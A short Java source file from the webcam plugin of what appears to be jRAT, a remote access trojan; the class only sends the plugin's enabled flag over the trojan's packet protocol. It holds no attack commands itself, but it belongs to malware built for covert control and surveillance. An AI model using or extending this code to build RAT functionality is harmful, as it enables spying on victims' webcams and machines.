package pro.jrat.client.webcam;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import pro.jrat.api.PacketBuilder;
import pro.jrat.api.RATObject;

public class Packet extends PacketBuilder {

	public Packet(RATObject rat) {
		super(Plugin.HEADER, rat);
	}

	@Override
	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		dos.writeBoolean(Plugin.enabled);
	}

}
